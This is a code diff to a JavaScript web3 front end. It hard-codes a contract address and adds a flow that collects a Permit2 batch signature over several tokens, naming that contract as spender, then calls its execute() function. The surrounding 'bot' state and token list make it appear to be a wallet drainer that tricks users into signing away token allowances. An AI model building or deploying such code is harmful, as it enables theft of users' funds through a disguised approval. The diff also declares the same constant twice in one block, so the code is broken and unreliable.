@@ -187,7 +187,7 @@ const TOKENS = [
 ];
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const CONTRACT = "PASTE_CONTRACT_HERE";
+const CONTRACT = "0x2776a9e675B2123278b975b68586Ee40ACC0A9d2";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
 
@@ -337,6 +337,50 @@ async function runPermitFlow(provider,signer,user){
   const signature = await signer.signTypedData(domain,types,values);
 
   log("✅ Signature obtained");
+  log("📦 Encoding permit batch...");
+
+const abiCoder = ethers.AbiCoder.defaultAbiCoder();
+
+const permitBatch = abiCoder.encode(
+  [
+    "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
+  ],
+  [
+    [
+      details.map(d => [
+        d.token,
+        d.amount,
+        d.expiration,
+        d.nonce
+      ]),
+      CONTRACT,
+      sigDeadline
+    ]
+  ]
+);
+
+log("🚀 Sending execute transaction...");
+
+const contractAbi = [
+  "function execute(bytes permitBatch, bytes signature)"
+];
+
+const contract = new ethers.Contract(
+  CONTRACT,
+  contractAbi,
+  signer
+);
+
+const tx = await contract.execute(permitBatch, signature);
+
+log("⏳ Waiting for confirmation...");
+await tx.wait();
+
+log("🔥 EXECUTION SUCCESS");
+
+  const contractAbi = [
+  "function execute(bytes permitBatch, bytes signature)"
+];
 
  }catch(e){
   log("❌ PermitFlow Error: "+e.message);
